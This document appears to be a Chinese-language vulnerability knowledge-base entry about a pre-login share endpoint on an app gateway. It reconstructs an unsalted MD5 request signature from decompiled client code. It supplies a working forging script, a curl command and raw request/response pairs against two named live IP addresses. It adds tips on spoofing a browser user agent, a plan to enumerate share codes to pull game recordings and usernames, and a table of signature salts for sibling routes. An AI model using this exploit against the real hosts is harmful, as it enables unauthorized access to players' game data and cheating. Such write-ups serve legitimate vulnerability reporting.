# 自研 App 网关 46750 /sharevcr 预登录分享接口：无盐签名可伪造

## 1. 目标与前置

- 入口：`POST https://<HOST>:46750/sharevcr`
  - 实测主机：`139.95.8.48:46750`、`47.242.109.76:46750`（同族后端，同型同结果）
- 请求体只有 4 个字段：`version` / `shareid` / `code` / `verify`
  - **没有 token、没有 userid、没有 Cookie / 会话** → 该路由是 pre-auth 的
- 头：`Content-Type: application/json;charset=utf-8`，带真实浏览器 UA
- IP 字面量直连需 `--noproxy '*'`（走平台代理会 TLS 建链失败 rc=35）；固定出口 IP、单发不重放、间隔 ≥5s
- 回包特征：`Server: Microsoft-IIS`、`Content-Type: application/json;charset=utf-8`、`Access-Control-Allow-Origin: *`

## 2. 签名算法（客户端 iOS IL 反编译所得，非猜测）

来源：`GeShareInfo` 的 `b__0` lambda（i8563/all_il.txt，另见 i8717/b2_update_il.txt）。

```
参与签名字段 = version(string), shareid(string), code(string)   # 按 key 字典序：code < shareid < version
signstr = "code" + code + "shareid" + shareid + "version" + version + code.ToString()
verify  = MD5(signstr).upper()      # 32 位大写十六进制
```

要点：

1. **无静态盐、无服务端密钥**——整串全部来自同一请求里的公开字段，因此签名不构成任何访问控制。
2. `version` 在客户端固定传 `"0.0.0.0"`。
3. 末尾要**把 code 再拼一次**（这是与同族 `private_*` 路由最大的不同，漏掉必失败）。
4. 排序是 `List.Sort` 对 `"key"+value` 字符串排序，本路由恰好等价于按字母序 code/shareid/version。

本轮两个可复算样本（已逐字核对）：

```
code=123456, shareid=1, version=0.0.0.0
  signstr = code123456 + shareid1 + version0.0.0.0 + 123456
          = "code123456shareid1version0.0.0.0123456"
  verify  = 4BEF2423258E640FEDAF338E40F54C92

code=1, shareid=1, version=0.0.0.0
  signstr = "code1shareid1version0.0.0.01"
  verify  = BAF08C4A29F3130E5472B3B1E047918C
```

## 3. A/B 三态对照（唯一变量 = verify）

### ① 基线：不带 verify

```http
POST /sharevcr HTTP/1.1
Host: <HOST>:46750
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Content-Type: application/json;charset=utf-8

{"version":"0.0.0.0","shareid":"1","code":"123456"}
```

```
HTTP/1.1 200 OK
Server: Microsoft-IIS
Content-Type: application/json;charset=utf-8
Content-Length: 39

{"ret":1,"msg":"参数检查失败！"}
```

### ② 离线复算 verify（命中签名层）

```http
POST /sharevcr HTTP/1.1
Host: <HOST>:46750
Content-Type: application/json;charset=utf-8

{"version":"0.0.0.0","shareid":"1","code":"123456","verify":"4BEF2423258E640FEDAF338E40F54C92"}
```

```
HTTP/1.1 200 OK
Server: Microsoft-IIS
Content-Type: application/json;charset=utf-8
Content-Length: 45

{"ret":3,"msg":"获取分享数据失败！"}
```

`ret` 由 1 变 3，说明服务端**确实校验了 verify 并接受了伪造值**，请求已越过签名门进入分享数据查询；
这一步没有 token→账号层（与 `/notices` 的 ret=2 不同），唯一下一关卡就是分享数据本身是否存在。

### ③ 错误 verify（证伪「服务端根本不校验」）

```
{"version":"0.0.0.0","shareid":"1","code":"1","verify":"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"}
→ HTTP 200 / 39B / {"ret":1,"msg":"参数检查失败！"}
```

同体换成正确值 `BAF08C4A29F3130E5472B3B1E047918C` → 200 / 45B / ret=3。

### ④ 跨主机复测

`47.242.109.76:46750` 同 body 同结果：`ret=1` ↔ `ret=3`，确认不是单机偶发。

### ⑤ 反例对照：/webplayingvcr 不是 pre-auth

同主机 `POST /webplayingvcr`（字段 version/token/type/userid/tableid/roundid/referencetime/gameid，
签名盐为客户端静态量 `private_webplayingvcr`）：**签名正确**后仍返回

```
{"ret":2,"msg":"账号认证失败！"}
```

说明 pre-auth 特性是 `/sharevcr` 这条分享路由独有的，不能外推成「该网关全部接口无鉴权」。

## 4. 危害判定与本轮边界

- 已证：签名门可零凭据离线伪造（**该 verify 不是安全控制**）。
- 真正门禁：`(shareid, code)` 分享码。
- **未取得任何 VCR 数据、未枚举分享码** → 故按中危上报：签名可伪造 + 数据访问仅依赖分享码熵。
- 若后续证明 `code` 为短数字/自增/时间戳，则一次枚举即可拿到 `data.vcr`（牌局录像）与 `data.username`，
  直接构成任意牌局透视（建议届时上调为高危，并补 ret=0 的成功样本）。
- 成功回包的形状（据页面渲染逻辑）：`ret=0` + `data.vcr`（牌谱/录像）+ `data.username`。

## 5. 复算脚本

```python
import hashlib, json

def make_verify(shareid: str, code: str, version: str = "0.0.0.0") -> str:
    # 关键：末尾再把 code 拼一次；本路由没有 private_* 盐
    signstr = "code" + code + "shareid" + shareid + "version" + version + code
    print("signstr =", signstr)
    return hashlib.md5(signstr.encode()).hexdigest().upper()

body = {"version": "0.0.0.0", "shareid": "1", "code": "123456"}
body["verify"] = make_verify(body["shareid"], body["code"], body["version"])
print(json.dumps(body, ensure_ascii=False))
# {"version": "0.0.0.0", "shareid": "1", "code": "123456", "verify": "4BEF2423258E640FEDAF338E40F54C92"}
```

```bash
curl.exe -k -s -i --noproxy "*" \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36" \
  -H "Content-Type: application/json;charset=utf-8" \
  --data-binary '{"version":"0.0.0.0","shareid":"1","code":"123456","verify":"4BEF2423258E640FEDAF338E40F54C92"}' \
  "https://<HOST>:46750/sharevcr"
```

## 6. 常见失败原因

| 现象 | 原因 |
|---|---|
| 恒 `ret=1` | 照抄 `/notices` 在末尾加 `private_notices`/`private_sharevcr` 盐（本路由无盐） |
| 恒 `ret=1` | 漏掉末尾那次 `code` 拼接，或用了 value+key 顺序 |
| 恒 `ret=1` | `version` 写成真实版本号而非固定 `"0.0.0.0"` |
| 恒 `ret=1` | verify 用了小写 MD5 |
| 无响应 / curl rc=35 | 走平台代理打 IP 字面量，需 `--noproxy '*'` |
| 403 / 无 body | 用了 curl 默认 UA，需伪装浏览器 |

## 7. 同族路由速查（同一网关，别混用算法）

| 路由 | 盐 | 签名通过后的状态 | 说明 |
|---|---|---|---|
| `/sharevcr` | **无**，末尾重复 code | `ret=3` 获取分享数据失败 | 本条，pre-auth，卡分享码 |
| `/notices` | `private_notices` | `ret=2` 账号认证失败 | 见 kb `app-gateway-notices-static-salt-signature-forge` |
| `/maintenance` | `private_maintenance` | `ret=0` 下发服务器清单 | 见 kb `app-gateway-maintenance-static-salt-signature-forge` |
| `/webplayingvcr` | `private_webplayingvcr` | `ret=2` 账号认证失败 | 非 pre-auth，勿误判 |
| `/name` | `private_queryusename` | 账号存在性 oracle | 见 kb `app-gateway-46750-name-prelogin-account-existence-oracle` |
